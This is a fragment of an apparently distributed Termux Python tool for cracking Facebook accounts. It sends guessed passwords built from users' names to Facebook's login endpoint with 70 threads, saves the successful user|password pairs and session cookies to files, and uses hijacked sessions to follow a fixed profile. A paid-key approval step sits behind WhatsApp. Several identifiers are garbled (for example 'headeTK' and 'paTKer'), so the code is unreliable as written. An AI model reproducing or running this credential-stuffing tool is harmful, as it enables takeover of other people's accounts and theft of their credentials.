...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801831018711?text=' + tks)

        

    r1=requests.get("https://github.com/TOXIC-S4GOR/S4GOR_PAID/blob/main/S4GOR.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 000TK FOR APROVAL S4GOR")     
...
\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mS4GOR✯S4GOR\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mMd.S4GOR Hasan Rear         \033[1;31m       │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mMd.S4GOR Hasan Rear          \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m S4GOR-2-0                  \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mS4GOR Vau                  \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m1.2                          \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32mS4GOR TERMUX COMMAND \033[1;37m {\033[1;36mS4GOR\033[1;37m} \033[1;31m     │
...
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32mmd.S4GOR.hasan.rear.12@gmail.com\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/sagor.hossen.007?mibextid=ZbWKwL")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[S4GOR]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2FdevelopeTK.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headeTK=header)
                ...
                das = {
                    ...
                    "next":"https://developeTK.facebook.com/tools/debug/accesstoken/"
                ...
                header1 = {
                    ...
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2FdevelopeTK.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                ...
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headeTK = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [S4GOR-OK 💥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/S4GOR_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/S4GOR_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.paTKer')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workeTK=70) as ssbworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [Last, xz[0] + 'Last1', xz[0] + 'fiTKt', xz[0] + 'last1']
            ...
            with sarfrazssb(max_workeTK=30) as ssbworld:
